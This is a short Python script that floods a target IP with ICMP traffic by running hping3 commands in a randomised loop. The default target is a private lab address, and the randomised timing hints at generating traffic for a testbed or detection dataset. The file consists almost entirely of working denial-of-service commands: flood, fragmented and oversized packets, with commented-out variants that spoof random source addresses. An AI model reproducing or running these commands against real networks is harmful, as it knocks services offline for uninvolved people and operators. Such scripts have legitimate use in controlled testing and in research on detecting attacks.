import subprocess
import random
import time
import signal

def run_icmp_attack(target_ip):
    print(f"Starting ICMP Attacks on {target_ip}...")

    icmp_attacks = [
        f"hping3 -1 --flood {target_ip}",
        f"sudo hping3 -1 --flood --frag -d {random.randint(5, 124)} {target_ip}",
        f"hping3 -1 -d {random.randint(600, 5600)} --flood {target_ip}",
        f"hping3 -1 -d {random.randint(100, 600)} --flood {target_ip}"
    ]

    # Uncomment to include additional ICMP attack variations
    # icmp_attacks.extend([
    #     f"hping3 -1 -d {random.randint(600, 5600)} --flood --rand-source {target_ip}",
    #     f"sudo hping3 -1 --flood --frag -d {random.randint(5, 124)} --rand-source {target_ip}",
    #     f"hping3 -S --udp --icmp --flood --rand-source {target_ip}",
    #     f"hping3 -1 --flood --rand-source {target_ip}"
    # ])

    try:
        while True:
            sleep_intervals = [random.randint(5, 15), random.randint(15, 60), random.randint(60, 90)]
            random_sleep = random.choice(sleep_intervals)
            random_attack = random.choice(icmp_attacks)

            print(f"Executing: {random_attack} for {random_sleep} seconds...")
            process = subprocess.Popen(random_attack, shell=True, preexec_fn=lambda: signal.signal(signal.SIGPIPE, signal.SIG_DFL))

            time.sleep(random_sleep)
            process.terminate()
            subprocess.call("killall hping3", shell=True)
            
            time.sleep(8)
    except KeyboardInterrupt:
        print("ICMP Attacks Stopped!")

if __name__ == "__main__":
    TARGET_IP = "172.30.0.2"  # Replace with the actual target IP
    run_icmp_attack(TARGET_IP)
